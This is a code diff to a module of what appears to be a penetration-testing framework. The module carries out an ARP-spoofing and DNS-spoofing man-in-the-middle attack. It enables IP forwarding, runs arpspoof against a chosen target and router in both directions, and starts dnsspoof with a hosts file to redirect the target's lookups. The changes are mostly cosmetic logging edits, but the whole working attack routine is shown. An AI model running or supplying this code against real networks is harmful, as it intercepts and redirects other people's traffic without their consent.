@@ -1,4 +1,7 @@
 #        Copyright (C) 2015 Noa-Emil Nissinen (4shadoww)
+
+from core.messages import *
+from core.anim import *
 from core import colors
 from collections import OrderedDict
 import os
@@ -14,7 +17,7 @@ conf = {
 	"email": "4shadoww0@gmail.com",
 	"initdate": "29.4.2016",
 	"lastmod": "27.12.2016",
-	"apisupport": False,
+	"apisupport": True,
 	"needroot": 1,
 	"dependencies": ["xterm", "dsniff"]
 }
@@ -37,26 +40,27 @@ customcommands = {
 	'stop': 'end dnsspoof'
 }
 
-
 #simple changelog
 changelog = "Version 1.0:\nrelease"
 
 def run():
 	hostslist = getpath.conf()+"hosts"
-	print(colors.blue+"ipv4 forwarding..."+colors.end)
+	animInfo("status: ipv4 forwarding...")
 	os.system('echo "1" >> /proc/sys/net/ipv4/ip_forward')
-	print(colors.blue+"starting arp spoof..."+colors.end)
+	animInfo("status: starting arp spoof...")
 	xterm1 = "xterm -e arpspoof -i "+ variables['interface'][0]+ " -t "+ variables['target'][0]+ " "+ variables['router'][0] + " &"
 	xterm2 = "xterm -e arpspoof -i "+ variables['interface'][0]+ " -t "+ variables['router'][0]+ " "+ variables['target'][0] + " &"
 	os.system(xterm1)
 	os.system(xterm2)
-	print(colors.blue+"waiting for arp spoof..."+colors.end)
+	animInfo("status: waiting for arp spoof...")
 	time.sleep(5)
-	print(colors.blue+"starting dns spoof..."+colors.end)
+	animInfo("status: starting dns spoof...", last=True)
 	xterm3 = "xterm -e dnsspoof -i "+ variables['interface'][0]+ " -f "+ hostslist + " host " + variables['target'][0]+ " &"
 	os.system(xterm3)
-	print(colors.blue+'use "stop" command to end'+colors.end)
+	printInfo('use "stop" command to end')
+	return "[suf]"
 
 def stop(args):
 	os.system("killall arpspoof")
 	os.system("killall dnsspoof")
+	return "[suf]"
